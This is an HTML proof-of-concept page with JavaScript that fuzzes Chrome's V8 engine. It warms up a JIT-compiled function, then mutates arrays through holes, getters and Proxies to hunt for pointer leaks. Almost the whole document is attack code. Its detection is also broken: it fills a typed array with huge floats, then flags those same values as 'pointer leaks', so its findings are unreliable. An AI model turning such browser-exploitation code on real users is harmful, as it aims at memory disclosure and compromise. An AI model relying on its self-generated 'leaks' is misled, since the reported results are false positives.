<!doctype html>
<meta charset="utf-8">
<title>V8 Pointer Leak PoC</title>

<h2>V8 Pointer Leak PoC - Safe Read-Only</h2>
<pre id="log"></pre>

<script>
const log = m => {
    document.getElementById("log").textContent += m + "\n";
    console.log(m);
};

// === TARGET FUNCTION ===
function vuln(a,i){ return a[i]+1.1; }

// === WARMUP ===
function warmup(){
    let arr = Array.from({length:50}, (_,i)=>i+0.5);
    for(let j=0;j<150000;j++) vuln(arr,j%50);
    return arr;
}

// === AGGRESSIVE MUTATION ===
function mutate(arr){
    for(let i=0;i<15;i++) delete arr[i];  // holes
    arr.length = 10;
    arr[80] = 1.7976931348623157e+308; // extreme float64
    arr[2] = {x:1};
    Object.defineProperty(arr,3,{
        get(){ arr.push(Math.random()*1e5); return 1.1; }
    });
    return arr;
}

// === PROXY / BREAK ASSUMPTION ===
function breakAssumption(a){
    return new Proxy(a,{
        get(t,p){
            if(p==="length") for(let i=0;i<10;i++) t.push(Math.random()*1e5);
            if(typeof p==="string" && !isNaN(p) && Math.random()<0.5) t.push(Math.random()*1e5);
            return Reflect.get(t,p);
        },
        set(t,p,v){
            if(Math.random()<0.2) t.length += 5;
            return Reflect.set(t,p,v);
        }
    });
}

// === TYPED ARRAY ===
let buf = new ArrayBuffer(0x100000); // 1MB
let f64 = new Float64Array(buf);

// === CHECK POINTER-LEAK ===
function checkTyped(){
    for(let i=0;i<f64.length;i++){
        let v = f64[i];
        if(Math.abs(v) > 1e12){ // kemungkinan pointer
            log(`[POINTER-LEAK] index ${i} value=${v}`);
        }
    }
}

// === MAIN ===
function run(){
    log("[*] warmup / JIT");
    let base = warmup();

    log("[*] starting pointer-leak fuzzing...");
    for(let i=0;i<200000;i++){
        let arr = [...base];
        arr = mutate(arr);
        arr = breakAssumption(arr);

        vuln(arr,5);

        // typed array overlay
        f64[i % f64.length] = 1.7976931348623157e+308;

        if(i%5000===0) checkTyped();
        if(i%1000===0) log(`iter ${i}`);
    }
    log("[*] finished PoC - pointer leak scan done");
}

run();
</script>
